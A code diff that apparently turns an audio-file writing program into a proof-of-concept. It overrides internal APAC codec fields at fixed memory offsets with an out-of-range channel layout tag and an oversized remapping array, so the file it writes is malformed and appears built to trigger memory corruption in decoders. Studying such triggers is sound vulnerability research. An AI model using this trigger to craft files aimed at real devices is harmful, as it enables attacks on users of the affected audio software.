@@ -1,6 +1,22 @@
 @import AVFAudio;
 @import AudioToolbox;
 
+#include <vector>
+
+struct CodecConfig {
+  char padding0[0x78];                         // 0
+  AudioChannelLayout* remappingChannelLayout;  // 0x78
+  char padding1[0xe0 - 0x80];                  // 0x80
+  std::vector<char> mRemappingArray;           // 0xe0
+};
+
+void OverrideApac(CodecConfig* config) {
+  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0xffff;
+  for (int i = 0; i < 0x10000; i++) {
+    config->mRemappingArray.push_back(0xff);
+  }
+}
+
 int main() {
   AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                            channels:1];
@@ -54,7 +70,8 @@ int main() {
               },
           },
   };
-  status = ExtAudioFileWrite(audioFile, 1, &audioBufferList);
+  status =
+      ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
   if (status) {
     fprintf(stderr, "error writing audiofile: %x\n", status);
     return 1;
